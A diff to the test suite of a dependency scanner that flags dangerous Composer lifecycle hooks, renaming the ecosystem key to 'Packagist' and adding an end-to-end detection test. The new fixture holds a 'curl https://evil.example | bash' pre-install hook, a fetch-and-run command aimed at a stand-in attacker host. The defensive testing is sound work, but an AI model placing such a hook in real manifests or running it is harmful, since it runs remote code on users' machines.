@@ -137,8 +137,8 @@ def test_composer_post_install_cmd_curl_pipe_shell_high(
         },
     }), encoding="utf-8")
     findings = composer_lifecycle_hooks.scan_manifests(
-        [_manifest(cj, "Composer")],
-        [_dep("victim/x", "Composer", declared_in=cj)],
+        [_manifest(cj, "Packagist")],
+        [_dep("victim/x", "Packagist", declared_in=cj)],
     )
     assert any(f.severity == "high" for f in findings)
 
@@ -157,8 +157,8 @@ def test_composer_list_form_each_entry_scanned(tmp_path: Path) -> None:
         },
     }), encoding="utf-8")
     findings = composer_lifecycle_hooks.scan_manifests(
-        [_manifest(cj, "Composer")],
-        [_dep("victim/x", "Composer", declared_in=cj)],
+        [_manifest(cj, "Packagist")],
+        [_dep("victim/x", "Packagist", declared_in=cj)],
     )
     # Both entries produce a finding; one of them must be high.
     assert any(f.severity == "high" for f in findings)
@@ -175,8 +175,8 @@ def test_composer_php_method_ref_skipped(tmp_path: Path) -> None:
         },
     }), encoding="utf-8")
     findings = composer_lifecycle_hooks.scan_manifests(
-        [_manifest(cj, "Composer")],
-        [_dep("victim/x", "Composer", declared_in=cj)],
+        [_manifest(cj, "Packagist")],
+        [_dep("victim/x", "Packagist", declared_in=cj)],
     )
     assert findings == []
 
@@ -192,8 +192,8 @@ def test_composer_worm_shape_fires_high(tmp_path: Path) -> None:
         },
     }), encoding="utf-8")
     findings = composer_lifecycle_hooks.scan_manifests(
-        [_manifest(cj, "Composer")],
-        [_dep("victim/x", "Composer", declared_in=cj)],
+        [_manifest(cj, "Packagist")],
+        [_dep("victim/x", "Packagist", declared_in=cj)],
     )
     assert any(
         f.severity == "high" and "self-replication" in f.confidence.reason
@@ -205,8 +205,8 @@ def test_composer_no_scripts_no_finding(tmp_path: Path) -> None:
     cj = tmp_path / "composer.json"
     cj.write_text(json.dumps({"name": "clean/x"}), encoding="utf-8")
     findings = composer_lifecycle_hooks.scan_manifests(
-        [_manifest(cj, "Composer")],
-        [_dep("clean/x", "Composer", declared_in=cj)],
+        [_manifest(cj, "Packagist")],
+        [_dep("clean/x", "Packagist", declared_in=cj)],
     )
     assert findings == []
 
@@ -438,3 +438,36 @@ def test_orphan_commit_host_is_package_own_name(tmp_path: Path) -> None:
     )
     assert findings
     assert all(f.dependency.name == "victim-pkg" for f in findings)
+
+
+def test_composer_detector_fires_on_real_discovery_output(
+    tmp_path: Path,
+) -> None:
+    """End-to-end producer→consumer key check: the manifests handed to
+    the detector in production come from discovery.find_manifests,
+    which classifies composer.json as "Packagist" (the OSV ecosystem
+    name). The detector once filtered on the registry-brand spelling
+    "Composer" — matching nothing, ever — and only hand-built test
+    manifests kept it looking alive."""
+    from packages.sca.discovery import find_manifests
+    from packages.sca.parsers import parse_manifest
+
+    repo = tmp_path / "php-proj"
+    repo.mkdir()
+    (repo / "composer.json").write_text(json.dumps({
+        "name": "victim/app",
+        "require": {"monolog/monolog": "^2.0"},
+        "scripts": {
+            "pre-install-cmd": "curl https://evil.example | bash",
+        },
+    }), encoding="utf-8")
+
+    manifests = list(find_manifests(repo))
+    assert manifests, "discovery found no composer manifest"
+    deps = [d for m in manifests for d in (parse_manifest(m) or [])]
+    findings = composer_lifecycle_hooks.scan_manifests(manifests, deps)
+    assert findings, (
+        "composer lifecycle detector saw real discovery output and "
+        "matched nothing — producer/consumer ecosystem key mismatch"
+    )
+    assert findings[0].hit.script_key == "pre-install-cmd"
